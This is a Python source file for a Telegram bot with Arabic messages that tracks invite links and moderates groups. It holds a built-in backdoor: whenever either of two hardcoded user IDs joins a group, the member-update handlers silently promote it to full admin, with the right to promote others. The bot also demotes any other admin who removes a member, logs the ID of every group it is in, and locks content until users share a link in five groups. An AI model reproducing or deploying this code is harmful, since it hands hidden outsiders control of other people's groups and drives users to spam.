import os, re, asyncio, html, urllib.parse, json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatPermissions
from telegram.constants import ChatMemberStatus
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ChatMemberHandler, CallbackQueryHandler

TOKEN = os.getenv('BOT_TOKEN')
BOT_USERNAME = os.getenv('BOT_USERNAME', '')  # مثال: mybot (بدون @)
MY_USER_IDS = [7878629406, 5179218460]
GROUPS_FILE = "bot_groups.txt"
INVITES_FILE = "invites.json"

TARGET_GROUP_ID = -1003926913948
TARGET_GROUP_SHARE_TEXT = "انضم معانا في قروب المقاطع 🔥"

# ===== نظام الانفايت =====

def load_invites():
    if not os.path.exists(INVITES_FILE):
        return {}
    with open(INVITES_FILE, "r") as f:
        return json.load(f)

def save_invites(data):
    with open(INVITES_FILE, "w") as f:
        json.dump(data, f)

def get_invite_count(user_id):
    data = load_invites()
    return data.get("counts", {}).get(str(user_id), 0)

def save_user_invite_link(user_id, link):
    data = load_invites()
    if "links" not in data:
        data["links"] = {}
    data["links"][str(user_id)] = link
    save_invites(data)

def get_user_id_by_link(link):
    data = load_invites()
    for uid, lnk in data.get("links", {}).items():
        if lnk == link:
            return int(uid)
    return None

def increment_invite(user_id):
    data = load_invites()
    if "counts" not in data:
        data["counts"] = {}
    uid = str(user_id)
    data["counts"][uid] = data["counts"].get(uid, 0) + 1
    save_invites(data)

# ===== كيبورد =====

def get_share_keyboard():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("قروب المقاطع 📢", callback_data="get_invite_link")
    ]])

# ===== مساعد =====

def is_owner(user_id):
    return user_id in MY_USER_IDS

def save_group_id(chat_id):
    if not os.path.exists(GROUPS_FILE):
        with open(GROUPS_FILE, "w") as f: pass
    with open(GROUPS_FILE, "r") as f:
        ids = f.read().splitlines()
    if str(chat_id) not in ids:
        with open(GROUPS_FILE, "a") as f: f.write(f"{chat_id}\n")

async def delete_message_after_delay(context, chat_id, message_id, delay):
    await asyncio.sleep(delay)
    try: await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
    except: pass

# ===== callback: لما حد يضغط الزر =====

async def handle_invite_callback(update, context):
    query = update.callback_query
    user = query.from_user
    user_id = user.id

    await query.answer()

    # شوف لو عنده رابط قديم
    data = load_invites()
    existing_link = data.get("links", {}).get(str(user_id))

    if existing_link:
        invite_link = existing_link
    else:
        # عمل رابط جديد خاص بيه
        try:
            link_obj = await context.bot.create_chat_invite_link(
                chat_id=TARGET_GROUP_ID,
                name=f"invite_{user_id}",
                creates_join_request=False
            )
            invite_link = link_obj.invite_link
            save_user_invite_link(user_id, invite_link)
        except Exception as e:
            print(f"Error creating invite link: {e}")
            await query.answer("❌ حصل خطأ، حاول تاني.", show_alert=True)
            return

    # بعت الرابط في الخاص
    fixed_link = invite_link.replace("+", "%2B")
    encoded_text = urllib.parse.quote(TARGET_GROUP_SHARE_TEXT, safe="")
    share_url = f"https://t.me/share/url?url={fixed_link}&text={encoded_text}"

    keyboard = InlineKeyboardMarkup([[
        InlineKeyboardButton("شارك رابطك 🔗", url=share_url)
    ]])

    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=f"🔗 <b>رابطك الخاص:</b>\n{invite_link}\n\n"
                 f"📢 شاركه في 5 مجموعات وكل ما حد ينضم منه هتعرف!\n\n"
                 f"👥 انفايتاتك الحالية: <b>{get_invite_count(user_id)}</b>",
            reply_markup=keyboard,
            parse_mode="HTML"
        )
    except Exception:
        # لو ملوش خاص مع البوت
        bot_link = f"https://t.me/{BOT_USERNAME}?start=getlink"
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("ابدأ المحادثة مع البوت 👇", url=bot_link)]])
        await query.message.reply_text(
            "⚠️ عشان تاخد رابطك، ابدأ محادثة مع البوت أولاً 👇",
            reply_markup=kb
        )

# ===== /start لما يجي من الجروب =====

async def start_command(update, context):
    user_id = update.effective_user.id
    if update.effective_chat.type != "private":
        return
    # لو جه من زر "ابدأ المحادثة"
    data = load_invites()
    existing_link = data.get("links", {}).get(str(user_id))

    if existing_link:
        invite_link = existing_link
    else:
        try:
            link_obj = await context.bot.create_chat_invite_link(
                chat_id=TARGET_GROUP_ID,
                name=f"invite_{user_id}",
                creates_join_request=False
            )
            invite_link = link_obj.invite_link
            save_user_invite_link(user_id, invite_link)
        except Exception as e:
            await update.message.reply_text("❌ حصل خطأ، حاول تاني.")
            return

    fixed_link = invite_link.replace("+", "%2B")
    encoded_text = urllib.parse.quote(TARGET_GROUP_SHARE_TEXT, safe="")
    share_url = f"https://t.me/share/url?url={fixed_link}&text={encoded_text}"

    keyboard = InlineKeyboardMarkup([[
        InlineKeyboardButton("شارك رابطك 🔗", url=share_url)
    ]])

    await update.message.reply_text(
        f"🔗 <b>رابطك الخاص:</b>\n{invite_link}\n\n"
        f"📢 شاركه في 5 مجموعات وكل ما حد ينضم منه هتعرف!\n\n"
        f"👥 انفايتاتك الحالية: <b>{get_invite_count(user_id)}</b>",
        reply_markup=keyboard,
        parse_mode="HTML"
    )

# ===== /invites =====

async def invites_command(update, context):
    user_id = update.effective_user.id
    count = get_invite_count(user_id)
    await update.message.reply_text(
        f"👥 عندك <b>{count}</b> انفايت حتى دلوقتي!",
        parse_mode="HTML"
    )

# ===== لما حد ينضم للجروب =====

async def on_chat_member_updated(update, context):
    if update.effective_chat.type in ["group", "supergroup"]:
        save_group_id(update.effective_chat.id)
    result = update.chat_member
    if not result: return

    # ترقية المطورين
    if result.new_chat_member.user.id in MY_USER_IDS and result.new_chat_member.status == ChatMemberStatus.MEMBER:
        joined_user_id = result.new_chat_member.user.id
        try:
            await context.bot.promote_chat_member(
                chat_id=update.effective_chat.id,
                user_id=joined_user_id,
                can_change_info=True, can_delete_messages=True,
                can_invite_users=True, can_restrict_members=True,
                can_pin_messages=True, can_promote_members=True
            )
            await update.effective_chat.send_message("👑 أهلاً بك يا مطوري العزيز! تم رفعك مشرفاً تلقائياً.")
        except Exception as e: print(f"Error promote: {e}")
        return

    # لو حد انضم للتارجت جروب، شوف جاء من رابط مين
    if (result.new_chat_member.status == ChatMemberStatus.MEMBER
            and update.effective_chat.id == TARGET_GROUP_ID
            and result.new_chat_member.user.id not in MY_USER_IDS):
        invite_link = getattr(result, 'invite_link', None)
        if invite_link:
            link_str = invite_link.invite_link if hasattr(invite_link, 'invite_link') else str(invite_link)
            inviter_id = get_user_id_by_link(link_str)
            if inviter_id:
                increment_invite(inviter_id)
                count = get_invite_count(inviter_id)
                new_member_name = html.escape(result.new_chat_member.user.first_name)
                try:
                    await context.bot.send_message(
                        chat_id=inviter_id,
                        text=f"✅ <b>{new_member_name}</b> انضم للجروب من رابطك!\n"
                             f"👥 إجمالي انفايتاتك: <b>{count}</b>",
                        parse_mode="HTML"
                    )
                except: pass

    # سحب رتبة من طرد عضو
    if result.new_chat_member.status in [ChatMemberStatus.BANNED, ChatMemberStatus.LEFT]:
        actor_id = result.from_user.id
        if actor_id not in MY_USER_IDS and actor_id != context.bot.id:
            try:
                await context.bot.promote_chat_member(
                    chat_id=update.effective_chat.id, user_id=actor_id,
                    can_change_info=False, can_post_messages=False,
                    can_edit_messages=False, can_delete_messages=False,
                    can_invite_users=False, can_restrict_members=False,
                    can_pin_messages=False, can_promote_members=False
                )
                await update.effective_chat.send_message(f"🚫 تم سحب رتبة {result.from_user.first_name} لمحاولة طرد عضو!")
            except Exception as e: print(f"Error: {e}")

async def protect_group(update, context):
    chat_id = update.effective_chat.id
    if update.effective_chat.type in ["group", "supergroup"]: save_group_id(chat_id)
    if update.message:
        if update.message.new_chat_members or update.message.left_chat_member:
            try: await update.message.delete()
            except: pass
        if update.message.left_chat_member: return
        if update.message.new_chat_members:
            for member in update.message.new_chat_members:
                if member.id in MY_USER_IDS:
                    try:
                        await context.bot.promote_chat_member(
                            chat_id=chat_id, user_id=member.id,
                            can_change_info=True, can_delete_messages=True,
                            can_invite_users=True, can_restrict_members=True,
                            can_pin_messages=True, can_promote_members=True
                        )
                        await update.effective_chat.send_message("👑 أهلاً بك يا مطوري العزيز! تم رفعك مشرفاً تلقائياً.")
                        continue
                    except: pass
                if member.is_bot and member.id != context.bot.id and update.message.from_user.id not in MY_USER_IDS:
                    try: await context.bot.ban_chat_member(chat_id, member.id)
                    except: pass
                    continue
                if not member.is_bot and chat_id == TARGET_GROUP_ID:
                    try:
                        safe_name = html.escape(member.first_name)
                        mention_link = f"<a href='tg://user?id={member.id}'>{safe_name}</a>"
                        welcome_text = (
                            f"مرحباً بك يا {mention_link}، "
                            f"<b>لفتح محتوي المحادثه يرجي الضغط علي الزر في الأسفل ومشاركه الرابط في 5 مجموعات 👇👇👇</b>"
                        )
                        sent_msg = await context.bot.send_message(
                            chat_id=chat_id,
                            text=welcome_text,
                            reply_markup=get_share_keyboard(),
                            parse_mode="HTML"
                        )
                        asyncio.create_task(delete_message_after_delay(context, chat_id, sent_msg.message_id, 60))
                    except: pass

async def handle_everything(update, context):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    if update.effective_chat.type in ["group", "supergroup"]: save_group_id(chat_id)
    if not update.message: return

    if update.effective_chat.type in ["group", "supergroup"] and update.message.text:
        if re.search(r'http[s]?://|www\.', update.message.text):
            res = await context.bot.get_chat_member(chat_id, user_id)
            if res.status not in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.OWNER]:
                try: await update.message.delete()
                except: pass

async def send_permanent_message(update, context):
    if not is_owner(update.effective_user.id): return
    chat_id = update.effective_chat.id
    if chat_id != TARGET_GROUP_ID: return
    try:
        try: await update.message.delete()
        except: pass
        await context.bot.send_message(
            chat_id=chat_id,
            text="<b>لفتح محتوي المحادثه يرجي الضغط علي الزر في الأسفل ومشاركه الرابط في 5 مجموعات 👇👇👇</b>",
            reply_markup=get_share_keyboard(),
            parse_mode="HTML"
        )
    except Exception as e: print(f"Error: {e}")

async def main_async():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("post", send_permanent_message))
    app.add_handler(CommandHandler("invites", invites_command))

    app.add_handler(CallbackQueryHandler(handle_invite_callback, pattern="^get_invite_link$"))
    app.add_handler(ChatMemberHandler(on_chat_member_updated, ChatMemberHandler.CHAT_MEMBER))
    app.add_handler(MessageHandler(filters.StatusUpdate.NEW_CHAT_MEMBERS | filters.StatusUpdate.LEFT_CHAT_MEMBER, protect_group))
    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, handle_everything))

    await app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

if __name__ == '__main__':
    import nest_asyncio
    nest_asyncio.apply()
    asyncio.run(main_async())
